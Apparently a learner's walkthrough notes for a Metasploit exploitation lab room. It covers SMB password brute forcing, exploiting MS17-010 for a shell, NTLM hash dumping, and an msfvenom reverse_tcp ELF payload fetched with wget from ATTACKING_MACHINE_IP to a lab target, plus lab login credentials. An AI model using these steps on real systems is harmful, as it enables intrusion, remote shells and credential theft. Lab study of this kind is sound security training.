# Activity performed as part of Metasploit: Exploitation

- **Pre-requisite** :
1. Download the wordlist file provided in the Room if you are using your own system.
2. Start both the target VM and Attack Machine.

- **Scanning** :
1. Search for portscan modules using the command:"search portscan". Use the approriate portscan option using the use command: use <result_no>.(Used auxiliary(scanner/portscan/tcp))
2. Check available options which can provide necessary parameter that need to be added to perform the portscan. command:"show options". Set necessary parameters using the set/setg options.
3. Use the run command to perform the port scan. Provides the number of open port with range of 1-10000 which are running tcp services.
4. Run the nmap scan to perform service scan. using the command:"nmap -sV -vv <Target_IP>"
5. In order to check the netBIOS name use the hint provided in the room get the module that needs to be used.(Used module: auxiliary(scanner/netbios/nbname))
6. Use the show options command to check the necessary parameters and set them using set/setg.
7. Use the run command to perform scanning using the nbname module.
8. Use the hint to check which module needs to used as part of the smb service.(Used module: auxiliary(scanner/smb/smb_login))
9. Use the show options module and set few parameters namely the SMB_USER, PASS_FILE. SMB_USER is the user mentioned in the question, PASS_FILE is the wordlist file mentioned in earlier section.
10. Use set command to set the parameter and run the module. The module executed the login process on sequential basis to find the password form the wordlist.

- **The Metasploit Database** : 
1. As this is an example workflow users should not encounter major issues.
2. Create a workspace using the command: "workspace -a <Workspace_Name>".
3. Change to workspace newly created using the command: "workspace <Workspace_Name>"
4. Check if the metasploit framework is configured with DB storage, command: "db_status"
5. Check workspace help command: "workspace -h"
6. Run help command to checkout the capabilities of the Metasploit framework.
7. Run the db_nmap command to save the result of the nmap scan to db. command: "db_nmap -sV -p- <Target_IP>".
8. To check if the results are stored use the hosts and services command to see the different hosts and services that were recorded.
9. We will use the vulnerability scanning module that finds potential MS17-010 vulnerabilities with the use auxiliary/scanner/smb/smb_ms17_010 command.
10. We set the RHOSTS value using hosts -R.
11. We have typed show options to check if all values were assigned correctly. (In this example, 10.10.138.32 is the IP address we have scanned earlier using the db_nmap command)
12. Once all parameters are set, we launch the exploit using the run or exploit command. 

Note: Try the SMB_LOGIN module 

- **Vulnerability Scanning** :
1. Search the smtp modules available. command: "search <Term>"
2. Check the result and fine the open relay using module. Use the use command and navigate to the module. command: "use <result_no>"
3. Using the info command to further get additional details on the module. command:"info".

- **Exploitation** :
1. Using the exploit module for the traget machine. As known to us its vulnerable to ms17_010.
2. To exploit set parameters mentioned for the module and get the reverse shell session.
3. Check the current working directory using pwd on the meterpreter terminal.
4. To get the flag file location using the search command. command:"search <filename>"
5. To view the file navigate to the location using cd command and view the file using the cat command.
6. To get the NTLM has of the specific user we can use the command: "hashdump" to get the hashdump of all the users. Output representation is as follows "username:RID:LM hash:NT hash:::"


- **Msfvenom** :
1. Launch the VM attached to this task. The username is murphy, and the password is 1q2w3e4r. You can connect via SSH or launch this machine in the browser. Once on the terminal, type "sudo su" to get a root shell, this will make things easier.
2. Create a meterpreter payload in the .elf format. command:"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Attacker> LPORT=<XXXX> -f elf > shell.elf". Here the LPORT can be the default port 4444
3. Transfer it to the target machine (you can start a Python web server on your attacking machine with the python3 -m http.server 9000 command and use wget http://ATTACKING_MACHINE_IP:9000/shell.elf to download it to the target machine). As the Target has lesser permissions use sudo additionally to get the file.
4. Use the module multi/handler. Set the parameters which are shown on using show options command. Also remember to set payload as linux/x86/meterpreter/reverse_tcp as the default payload is different.
5. Run the module and then run the shell.elf file on the target.
6. Attacker should get the session the metasploit.
7. Use the session to navigate through file system. To make the session as background process use Ctrl+Z.
8. Use the module:"post/linux/gather/hashdump", to get the hashdump of other user on the target system.
9. Use the session again to navigate to file shadow to get the hashes of other users.

Note: While executing the shell.elf make sure you are the root user(use command: sudo su on the target). If not you might have to escalate previleges.

